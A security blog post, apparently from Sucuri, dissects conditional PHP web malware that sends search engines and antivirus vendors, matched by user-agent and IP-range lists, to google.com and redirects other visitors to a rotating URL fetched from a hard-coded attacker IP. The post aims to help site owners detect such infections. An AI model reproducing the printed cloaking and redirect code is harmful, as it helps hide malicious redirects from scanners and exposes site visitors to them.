@@ -1,0 +1,109 @@
+Understanding Conditional Malware – IP Centric Variation
+
+In today’s web malware landscape you can’t help but take a minute to familiarize yourself with a concept known as conditional malware.
+As implied in the name, it’s malware that only works when specific rules are met. Those rules can range from specific IP ranges to time of day. They are very tricky and as you would expect, evolve every day. Often when someone calls or sends us an email asking why we’re not picking something up on our free scanner, SiteCheck, that’s usually the case. As of late, the PHARMA hack is being notorious for the use of conditional type infections making it exceptionally difficult to detect via HTTP.
+In this post we’ll take a look at a specific type of conditional malware that is applying specific rules around which IP’s it will not display to. It’s the same string that we wrote about earlier causing us to flag Google.com as malware.. oops..:)
+My goal is to keep it high level, not going to get crazy with the code, but I do want to take some time to walk through it so that you can learn to detect similar infections in your environment.
+Dissecting The Code
+
+User Agents
+The first thing you notice when you see the infection is the use of $user_agent_to_filter. This is telling the code to dispaly if it comes from any one of those user agents:
+$user_agent_to_filter = array( ‘#Asks*Jeeves#i’, ‘#HPs*Webs*PrintSmart#i’, ‘#Safari#i’, ‘#HTTrack#i’, ‘#Chrome#i’, ‘#Mac#i’, ‘#IDBot#i’, ‘#Indys*Library#’, ‘#ListChecker#i’, ‘#MSIECrawler#i’, ‘#NetCache#i’, ‘#Nutch#i’, ‘#RPT-HTTPClient#i’, ‘#rulinki.ru#i’, ‘#Twiceler#i’, ‘#WebAlta#i’, ‘#Websters*Pro#i’,’#www.cys.ru#i’, ‘#Wysigot#i’, ‘#Yahoo!s*Slurp#i’, ‘#Yeti#i’, ‘#Accoona#i’, ‘#CazoodleBot#i’, ‘#CFNetwork#i’, ‘#ConveraCrawler#i’,’#DISCo#i’, ‘#Downloads*Master#i’, ‘#FASTs*MetaWebs*Crawler#i’, ‘#Flexums*spider#i’, ‘#Gigabot#i’, ‘#HTMLParser#i’, ‘#ia_archiver#i’, ‘#ichiro#i’, ‘#IRLbot#i’, ‘#km.rus*bot#i’, ‘#kmSearchBot#i’, ‘#libwww-perl#i’, ‘#Lupa.ru#i’, ‘#LWP::Simple#i’, ‘#lwp-trivial#i’, ‘#Missigua#i’, ‘#MJ12bot#i’,
+‘#msnbot#i’, ‘#msnbot-media#i’, ‘#Offlines*Explorer#i’, ‘#OmniExplorer_Bot#i’,
+‘#PEAR#i’, ‘#psbot#i’, ‘#Python#i’, ‘#rulinki.ru#i’, ‘#SMILE#i’,
+‘#Speedy#i’, ‘#Teleports*Pro#i’, ‘#TurtleScanner#i’, ‘#User-Agent#i’, ‘#voyager#i’,
+‘#Webalta#i’, ‘#WebCopier#i’, ‘#WebData#i’, ‘#WebZIP#i’, ‘#Wget#i’,
+‘#Yandex#i’, ‘#Yanga#i’, ‘#Yeti#i’, ‘#msnbot#i’, ‘#spider#i’, ‘#yahoo#i’, ‘#jeeves#i’ ,’#google#i’ ,’#altavista#i’,
+‘#scooter#i’ ,’#avs*fetch#i’ ) ;
+Filtering IPs
+The next you notice is there long array of IP’s. In essence, if you contain an IP that equals their value or even fits within the range a different action will occur. How nice of them to actually comment on those ranges that belong to search engines and AntiVirus providers.
+$stop_ips_masks = array(
+“66.249.[6-9][0-9].[0-9]+”, // Google NetRange: 66.249.64.0 – 66.249.95.255
+“74.125.[0-9]+.[0-9]+”, // Google NetRange: 74.125.0.0 – 74.125.255.255
+“65.5[2-5].[0-9]+.[0-9]+”, // MSN NetRange: 65.52.0.0 – 65.55.255.255,
+“74.6.[0-9]+.[0-9]+”, // Yahoo NetRange: 74.6.0.0 – 74.6.255.255
+“67.195.[0-9]+.[0-9]+”, // Yahoo#2 NetRange: 67.195.0.0 – 67.195.255.255
+“72.30.[0-9]+.[0-9]+”, // Yahoo#3 NetRange: 72.30.0.0 – 72.30.255.255
+“38.[0-9]+.[0-9]+.[0-9]+”, // Cuill: NetRange: 38.0.0.0 – 38.255.255.255
+“93.172.94.227”, // MacFinder
+“212.100.250.218”, // Wells Search II
+“128.103.64.[0-9]+”, // StopBadWare
+“150.70.[0-9]+.[0-9]+”, // TrendMicro
+“216.104.[0-9]+.[0-9]+”, // TrendMicro
+“207.46.[0-9]+.[0-9]+”, // Microsoft
+“157.55.[0-9]+.[0-9]+”, // Microsoft
+“213.180.[0-9]+.[0-9]+”, // Yandex
+“217.23.[0-9]+.[0-9]+”, // Kaspersky
+“91.103.64.[0-9]+”, // Kaspersky
+“215.5.80.[0-9]+”, // Kaspersky
+“195.168.53.[0-9]+”, // NOD32
+“220.255.1.[0-9]+”, // domain-tool.com
+“69.28.58.[0-9]+”, // Symantec
+“66.147.244.[0-9]+”, // freepcsecurity.co.uk
+“128.111.48.[0-9]+”, // wepawet.cs.ucsb.edu
+“209.9.239.[0-9]+”, // jsunpack.jeek.org
+“62.67.194.[0-9]+”, // support.clean-mx.de
+“195.214.79.[0-9]+”, // support.clean-mx.de
+“97.74.141.[0-9]+”, // malwareurl.com
+“213.171.194.[0-9]+”, // spamhaus
+“139.146.167.[0-9]+”, // malwaredomains
+“88.160.229.[0-9]+”, // malwaredomains
+“69.162.79.[0-9]+”, // malwarebytes
+“66.40.145.[0-9]+”, // bitdefender
+“66.223.50.[0-9]+”, // bitdefender
+“204.14.90.[0-9]+”, // spywarewarrior.com
+“92.123.155.[0-9]+”, // Sophos
+“213.31.172.[0-9]+”, // Sophos
+“143.215.130.[0-9]+”, // Malwaredomainlist
+“150.70.172.[0-9]+”, // TrendNet
+“64.88.164.[0-9]+”, // AVG
+“102.157.192.[0-9]+”, // ZeusTracker
+“109.65.41.[0-9]+”, // ZeusTracker
+“110.77.248.[0-9]+”, // Virustotal
+“59.6.145.[0-9]+”, // Virustotal
+“67.124.37.[0-9]+”, // Virustotal
+The Rule (a.k.a. The Condition)
+If Condition is Met, then..
+Then once the user agents have been defined and the “bad” IP’s flagged, you then have the condition. In this instance what it is saying is if any of the IP’s fall within those identified above redirect them to http://www.google.com. How annoying is that!!!!
+foreach ( $stop_ips_masks as $k=>$v )
+{
+if ( preg_match( ‘#^’.$v.’$#’, $_SERVER[‘REMOTE_ADDR’]) )
+$is_bot = TRUE ;
+}
+if ( $is_bot || !( FALSE === strpos( preg_replace( $user_agent_to_filter, ‘-NO-WAY-‘, $_SERVER[‘HTTP_USER_AGENT’] ), ‘-NO-WAY-‘ ) ) )
+{
+header(“Location: http://www.google.com/”);
+die();
+If Condition is Not Met, then…
+Now that we know what it does if the condition is met, let’s look at what it does if the condition is not met.
+set_time_limit(30);
+$cache = dirname(__FILE__) . ‘/link.cache’;
+$link = @file_get_contents($cache);
+if (strlen($link) < 20 || (time()-@filemtime($cache)) > 60)
+{
+$link = @file_get_contents(‘http://88.198.28.38/api.php?action=link&aid=658&fid=3714&hash=beca79b043b1b5e25d514191ce8a691c291b8626’);
+if (strlen($link) > 20)
+{
+$fp = @fopen ($cache, ‘w’);
+@fputs($fp, $link);
+@fclose($fp);
+}
+}
+header (‘Location: ‘ . $link);
+exit;
+As you can see, if the condition is not met then the incoming request continues down the the yellow brick road and finds at a new domain courtesy of this:
+@file_get_contents(‘http://88.198.28.38/api.php?action=link&aid=658&fid=3714&hash=beca79b043b1b5e25d514191ce8a691c291b8626’);
+That little API defines which URL to share with the request. It actually rotates the domains so if you hit it multiple time you’re not likely to get the same one.
+What Did We Learn
+
+Hopefully you gained an appreciation for what conditional malware is all about and the challenges with catching it via HTTP crawlers.
+This specific instance only talks to one type, there are varying permutations of this floating the interwebs. If you’re a client, we highly recommend enabling the server-side scanner as it’s not restricted to the limitations found with HTTP crawlers.
+A couple of tale tell signs that something is wrong is if you start getting comments like this:
+
+I am being redirected on my mobile device but not your machine
+I am being redirected on my Chrome broswer but not in Firefox
+I remember seeing something a day agao but now its not there
+
+Keep an eye out for questions or comments that resemble any of those points, if you hear them you now know that you’re likely dealing with some type of conditional malware.
+
+If you have any questions pertaining to this post please feel free to email us at info@sucuri.net.
